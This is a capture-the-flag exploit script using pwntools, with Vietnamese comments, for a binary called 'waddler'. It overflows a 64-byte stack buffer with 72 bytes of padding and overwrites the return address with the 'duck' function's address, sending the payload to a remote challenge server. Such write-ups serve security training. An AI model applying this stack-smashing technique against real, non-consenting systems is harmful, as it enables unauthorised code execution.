# exploit.py
from pwn import *

# Cài đặt context cho file binary (64-bit)
context.binary = elf = ELF('./waddler')

# Bắt đầu tiến trình
# Để chạy local, dùng process(). Để kết nối tới server, dùng remote('host', port)
p = process()
p = remote('chall.v1t.site', 30210)

# Gửi một dòng để gdb có thể attach (nếu cần debug)
# gdb.attach(p, gdbscript='''
#     b *main+53
#     continue
# ''')

# Lấy địa chỉ của hàm duck từ file ELF
duck_address = elf.symbols['duck']
log.info(f"Address of duck function: {hex(duck_address)}")

# Xây dựng payload
# 64 bytes cho buffer + 8 bytes cho RBP
padding = b'A' * 72

# Ghép padding với địa chỉ của hàm duck (định dạng little-endian 64-bit)
payload = padding + p64(duck_address)

# Gửi payload sau khi nhận được dòng "The Ducks are coming!"
p.sendlineafter(b"The Ducks are coming!\n", payload)

# Nhận và in ra output của chương trình (sẽ chứa flag)
p.interactive()